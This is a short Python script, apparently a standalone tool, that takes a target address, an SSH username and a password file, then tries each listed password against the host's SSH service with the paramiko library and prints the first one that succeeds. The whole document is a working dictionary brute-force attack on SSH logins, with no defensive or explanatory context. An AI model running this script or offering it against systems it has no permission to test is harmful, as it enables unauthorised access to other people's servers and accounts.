import paramiko, sys, os, socket
from termcolor import colored
host = input(colored('[+] Target address: ', 'blue'))
username = input(colored('[+] ssh username: ', 'blue'))
input_file = input(colored('[+] passwords file: ', 'blue'))

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code

while os.path.exists(input_file) == False:
    print(colored('[!] that file doesnt exist', 'red'))
    input_file = input(colored('[+] "q" to exit; passwords file: ', 'blue'))
    if input_file == 'q':
        sys.exit(1)
    

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(colored(f'[+] found password: "{password}" for account "{username}"', 'green'))
                break
            elif response == 1:
                pass
            elif response == 2:
                print(colored('[!] Cant connerc', 'red'))
                sys.exit(1)
        except Exception as e:
            print(e)
            pass